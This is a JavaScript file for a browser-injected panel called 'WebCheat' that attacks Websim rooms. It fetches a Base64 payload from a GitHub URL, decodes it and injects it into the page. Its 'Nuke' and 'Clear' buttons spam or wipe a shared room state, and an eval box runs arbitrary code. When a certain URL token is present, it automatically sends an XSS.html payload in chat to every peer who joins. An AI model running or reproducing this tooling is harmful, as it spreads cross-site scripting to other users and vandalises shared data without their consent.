function createDarkModePanel() {
  // Check if the panel already exists
  if (document.getElementById("darkModePanel")) {
    console.log("Dark mode panel already exists.");
    return;
  }

  // Create and add the draggable panel
  const panel = document.createElement("div");
  panel.id = "darkModePanel";
  panel.style.position = "absolute";
  panel.style.width = "700px";
  panel.style.height = "400px";
  panel.style.backgroundColor = "#333"; // Dark mode background
  panel.style.color = "#fff"; // Dark mode text
  panel.style.border = "1px solid #444";
  panel.style.borderRadius = "8px";
  panel.style.padding = "10px";
  panel.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.2)";
  panel.style.cursor = "move";
  panel.innerHTML = "<h1>WebCheat</h1>";
  panel.style.overflow = 'scroll';

  // Position the panel in the middle of the viewport
  const viewportHeight = window.innerHeight;
  const scrollY = window.scrollY;
  const viewportWidth = window.innerWidth;

  panel.style.top = `${scrollY + viewportHeight / 2 - 100}px`; // Center vertically (-100 to adjust for half the panel height)
  panel.style.left = `${viewportWidth / 2 - 150}px`; // Center horizontally (-150 to adjust for half the panel width)

  // Append panel to the body
  document.body.appendChild(panel);

  // Make the panel draggable
  panel.addEventListener("mousedown", function (e) {
    let shiftX = e.clientX - panel.getBoundingClientRect().left;
    let shiftY = e.clientY - panel.getBoundingClientRect().top;

    function moveAt(pageX, pageY) {
      panel.style.left = pageX - shiftX + "px";
      panel.style.top = pageY - shiftY + "px";
    }

    function onMouseMove(event) {
      moveAt(event.pageX, event.pageY);
    }

    document.addEventListener("mousemove", onMouseMove);

    panel.onmouseup = function () {
      document.removeEventListener("mousemove", onMouseMove);
      panel.onmouseup = null;
    };
  });

  // Prevent default drag events
  panel.ondragstart = function () {
    return false;
  };
  // Create and add the "Load Equinox" button
const loadEquinoxButton = document.createElement("button");
loadEquinoxButton.id = "loadEquinoxButton";
loadEquinoxButton.textContent = "Load Equinox";
loadEquinoxButton.style.padding = "10px 20px";
loadEquinoxButton.style.backgroundColor = "#333";
loadEquinoxButton.style.color = "#fff";
loadEquinoxButton.style.border = "none";
loadEquinoxButton.style.borderRadius = "5px";
loadEquinoxButton.style.cursor = "pointer";

// Append the button to the body
panel.appendChild(loadEquinoxButton);

// Add a click event listener to the button
loadEquinoxButton.addEventListener("click", async () => {
  try {
    // Fetch the equinox file from the raw GitHub URL
    const response = await fetch("https://raw.githubusercontent.com/JammyCat91283/websim/main/Equinox");
    if (!response.ok) {
      throw new Error(`Failed to load equinox: ${response.statusText}`);
    }

    // Get the Base64-encoded content of the file
    const base64Content = await response.text();

    // Decode the Base64 content
    const decodedContent = atob(base64Content);
    document.body.innerHTML += decodedContent;

    console.log("Equinox loaded and appended to the page.");
  } catch (error) {
    console.error("Error loading equinox:", error);
    alert("Failed to load equinox. Check the console for details.");
  }
});
  // Create a button to nuke / clear the database.
  // Create "Nuke" and "Clear" buttons
const nukeButton = document.createElement("button");
nukeButton.id = "nukeButton";
nukeButton.textContent = "Nuke";
nukeButton.style.margin = "10px";
nukeButton.style.padding = "10px 20px";
nukeButton.style.backgroundColor = "#ff4d4d";
nukeButton.style.color = "#fff";
nukeButton.style.border = "none";
nukeButton.style.borderRadius = "5px";
nukeButton.style.cursor = "pointer";

const clearButton = document.createElement("button");
clearButton.id = "clearButton";
clearButton.textContent = "Clear";
clearButton.style.margin = "10px";
clearButton.style.padding = "10px 20px";
clearButton.style.backgroundColor = "#4caf50";
clearButton.style.color = "#fff";
clearButton.style.border = "none";
clearButton.style.borderRadius = "5px";
clearButton.style.cursor = "pointer";

// Append buttons to the body
panel.appendChild(nukeButton);
panel.appendChild(clearButton);

// Initialize WebsimSocket and connect to the room


// Nuke functionality
nukeButton.addEventListener("click", async () => {
  try {
    const room = new WebsimSocket();
    room.initialize();
    const promises = [];
    const amount = 10; // Example: specify the number of items to create
    const template = "Nuke Message {i}"; // Replace with your desired message template
    const type = "exampleType"; // Replace with the actual type for your collection

    for (let i = 0; i < amount; i++) {
      const message = template.replace("{i}", i);
      promises.push(
        room.collection(type).create({
          content: message,
          nuked: true,
          intensity: Math.floor(Math.random() * 100),
        })
      );
    }

    await Promise.all(promises);
    console.log("Nuke operation completed.");
  } catch (error) {
    console.error("Error during Nuke operation:", error);
  }
});

// Clear functionality
clearButton.addEventListener("click", async () => {
  try {
    const room = new WebsimSocket();
    room.initialize();
    const roomState = room.roomState; // Get all values from room state
    const updatedState = {};

    // Set all keys to null in the updated state
    for (const key in roomState) {
      updatedState[key] = null;
    }

    // Update the room state to clear the values
    await room.updateRoomState(updatedState);
    console.log("Clear operation completed.");
  } catch (error) {
    console.error("Error during Clear operation:", error);
  }
});
  // Create and add the "Find XSS" button
  const findXSSButton = document.createElement("button");
  findXSSButton.id = "findXSSButton";
  findXSSButton.textContent = "Find XSS";
  findXSSButton.style.margin = "10px";
  findXSSButton.style.padding = "10px 20px";
  findXSSButton.style.backgroundColor = "#555";
  findXSSButton.style.color = "#fff";
  findXSSButton.style.border = "none";
  findXSSButton.style.borderRadius = "5px";
  findXSSButton.style.cursor = "pointer";

  panel.appendChild(findXSSButton);
// Add a log area to the panel
const logArea = document.createElement("div");
logArea.id = "logArea";
logArea.style.margin = "10px";
logArea.style.padding = "10px";
logArea.style.backgroundColor = "#222";
logArea.style.color = "#fff";
logArea.style.border = "1px solid #444";
logArea.style.borderRadius = "5px";
logArea.style.height = "200px";
logArea.style.overflowY = "auto";
panel.appendChild(logArea);

// Helper function to log messages to the log area
function logMessage(message, type = "info") {
  const logEntry = document.createElement("div");
  logEntry.textContent = message;
  logEntry.style.color = type === "error" ? "red" : "#fff";
  logArea.appendChild(logEntry);
  logArea.scrollTop = logArea.scrollHeight; // Auto-scroll to the latest log
}

// Modify the "Find XSS" button to use the log area
findXSSButton.addEventListener("click", async () => {
  logMessage("Scanning for scripts and potential XSS vulnerabilities...");
  const scripts = document.querySelectorAll("script");

  for (const script of scripts) {
    if (script.src) {
      logMessage(`Fetching external script: ${script.src}`);
      try {
        const response = await fetch(script.src);
        const scriptContent = await response.text();
        analyzeScript(scriptContent, script.src);
      } catch (error) {
        logMessage(`Failed to fetch script from ${script.src}: ${error}`, "error");
      }
    } else {
      logMessage("Analyzing inline script...");
      analyzeScript(script.innerHTML, "inline script");
    }
  }
});

function analyzeScript(scriptContent, source) {
  logMessage(`Analyzing script from ${source}...`);
  const dangerousPatterns = [
    /innerHTML\s*=/g,
    /document\.write/g,
    /eval\s*\(/g,
    /setTimeout\s*\(/g,
    /setInterval\s*\(/g,
    /location\.hash/g,
    /on\w+\s*=/g,
  ];

  let foundIssues = false;

  dangerousPatterns.forEach((pattern) => {
    const matches = scriptContent.match(pattern);
    if (matches) {
      foundIssues = true;
      logMessage(`Potential XSS vulnerability found in ${source}: Pattern "${pattern}" matches ${matches.length} time(s).`, "error");
    }
  });

  if (!foundIssues) {
    logMessage(`No potential XSS vulnerabilities found in ${source}.`);
  }
}

// Add an input field and button to send commands
const commandInput = document.createElement("input");
commandInput.id = "commandInput";
commandInput.type = "text";
commandInput.placeholder = "Enter command...";
commandInput.style.margin = "10px";
commandInput.style.padding = "10px";
commandInput.style.width = "calc(100% - 150px)";
commandInput.style.border = "1px solid #444";
commandInput.style.borderRadius = "5px";
panel.appendChild(commandInput);

const sendCommandButton = document.createElement("button");
sendCommandButton.id = "sendCommandButton";
sendCommandButton.textContent = "Send Command";
sendCommandButton.style.margin = "10px";
sendCommandButton.style.padding = "10px 20px";
sendCommandButton.style.backgroundColor = "#007bff";
sendCommandButton.style.color = "#fff";
sendCommandButton.style.border = "none";
sendCommandButton.style.borderRadius = "5px";
sendCommandButton.style.cursor = "pointer";
panel.appendChild(sendCommandButton);

sendCommandButton.addEventListener("click", () => {
  const inputData = commandInput.value;
  if (!inputData) {
    logMessage("Command input is empty. Please enter a command.", "error");
    return;
  }

  try {
    const room = new WebsimSocket();
    room.initialize();
    room.send({ type: "command", command: inputData });
    logMessage(`Command sent: ${inputData}`);
  } catch (error) {
    logMessage(`Failed to send command: ${error}`, "error");
  }
});
  const codeInput = document.createElement("textarea");
codeInput.id = "codeInput";
codeInput.placeholder = "Enter your JavaScript code here...";
codeInput.style.margin = "10px";
codeInput.style.padding = "10px";
codeInput.style.width = "calc(100% - 30px)";
codeInput.style.height = "100px";
codeInput.style.border = "1px solid #444";
codeInput.style.borderRadius = "5px";
codeInput.style.backgroundColor = "#222";
codeInput.style.color = "#fff";
codeInput.style.fontFamily = "monospace";
panel.appendChild(codeInput);

// Create a button to execute the code
const runCodeButton = document.createElement("button");
runCodeButton.id = "runCodeButton";
runCodeButton.textContent = "Run Code";
runCodeButton.style.margin = "10px";
runCodeButton.style.padding = "10px 20px";
runCodeButton.style.backgroundColor = "#007bff";
runCodeButton.style.color = "#fff";
runCodeButton.style.border = "none";
runCodeButton.style.borderRadius = "5px";
runCodeButton.style.cursor = "pointer";
panel.appendChild(runCodeButton);

// Add an event listener to the button
runCodeButton.addEventListener("click", () => {
  const code = codeInput.value;
  if (!code) {
    alert("Please enter some code to run.");
    return;
  }

  try {
    // Execute the code entered by the user
    const result = eval(code); // WARNING: Be cautious when using eval
    console.log("Code executed successfully:", result);
    alert("Code executed successfully. Check the console for output.");
  } catch (error) {
    console.error("Error executing code:", error);
    alert(`Error executing code: ${error.message}`);
  }
});
  const labelPage = document.createElement("p");
  labelPage.textContent = window.location.href;
  panel.appendChild(labelPage);
  // Check if the URL contains the specified keyword
if (window.location.href.includes("_dor_svv8_1rml0843vu")) {
  // Create the checkbox and label
  const autoSendCheckbox = document.createElement("input");
  autoSendCheckbox.type = "checkbox";
  autoSendCheckbox.id = "autoSendCheckbox";
  autoSendCheckbox.style.margin = "10px";

  const autoSendLabel = document.createElement("label");
  autoSendLabel.htmlFor = "autoSendCheckbox";
  autoSendLabel.textContent = "Automatically send the client to others?";
  autoSendLabel.style.color = "#fff";

  // Append the checkbox and label to the panel
  panel.appendChild(autoSendCheckbox);
  panel.appendChild(autoSendLabel);

  // Function to handle new client join and send XSS.html contents
  async function handleNewClientJoin() {
    try {
      const response = await fetch("https://raw.githubusercontent.com/JammyCat91283/websim/main/XSS.html");
      if (!response.ok) {
        throw new Error(`Failed to fetch XSS.html: ${response.statusText}`);
      }

      const contentsOfXSS = await response.text();

      // Use room.peers and send the contents to the new client
      const room = new WebsimSocket();
      room.initialize();

      setInterval(() => {
        const currentPeers = room.peers || {};

        // Check if a new peer has joined
        for (const peerId in currentPeers) {
          if (!previousPeers[peerId]) {
            // A new peer has joined
            if (autoSendCheckbox.checked) {
              room.send({
                type: "chat",
                message: contentsOfXSS,
                section: "chicken"
              });
              console.log(`Sent contents of XSS.html to new peer: ${peerId}`);
            }
          }
        }

        // Update the previousPeers to the current state
        previousPeers = { ...currentPeers };
      }, 1000); // Check every 1 second
    } catch (error) {
      console.error("Error fetching or sending XSS.html contents:", error);
    }
  }

  // Initialize the handling of new client joins
  handleNewClientJoin();
}
}

// Call the function to ensure the panel is created
createDarkModePanel();
